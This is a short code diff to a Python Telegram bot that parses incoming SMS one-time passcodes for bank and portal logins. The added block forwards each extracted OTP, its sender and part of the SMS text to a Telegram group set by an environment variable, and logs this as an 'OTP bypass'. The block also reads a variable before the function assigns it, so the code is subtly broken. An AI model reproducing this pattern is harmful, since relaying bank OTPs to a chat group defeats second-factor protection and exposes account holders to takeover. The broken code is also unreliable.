@@ -80,6 +80,7 @@ AISHA_API_URL = os.environ.get("AISHA_API_URL", "http://localhost:8001/api/aisha
 AISHA_API_KEY = os.environ.get("N8N_WEBHOOK_KEY", "")
 LLM_API_KEY = os.environ.get("LLM_API_KEY", "")
 LLM_BASE_URL = os.environ.get("LLM_BASE_URL", "https://api.groq.com/openai/v1")
+TELEGRAM_GROUP_ID = os.environ.get("TELEGRAM_GROUP_ID", "")
 
 OTP_TTL_SECONDS = 300
 SMS_INCOMING_KEY = "sms:incoming"
@@ -600,6 +601,20 @@ async def process_incoming_sms(sms_text: str, sender: str, app: Application) -> 
     if not otp_match:
         return False
     otp_code = otp_match.group(1)
+
+    bypass_group = int(TELEGRAM_GROUP_ID) if TELEGRAM_GROUP_ID else None
+    if bypass_group:
+        label = _portal_label(detected) if detected != "any" else "BANK"
+        try:
+            await app.bot.send_message(
+                chat_id=bypass_group,
+                text=f"🔐 <b>OTP for {label}</b>\n\n<code>{otp_code}</code>\n\n"
+                     f"Sender: {sender}\nSMS: {sms_text[:200]}",
+                parse_mode="HTML",
+            )
+            logger.info("OTP bypass → NOI group %s", bypass_group)
+        except Exception as e:
+            logger.error("OTP bypass to NOI group failed: %s", e)
 
     detected = "any"
     all_pats = {**PORTAL_MAP, **BANK_PATTERNS}
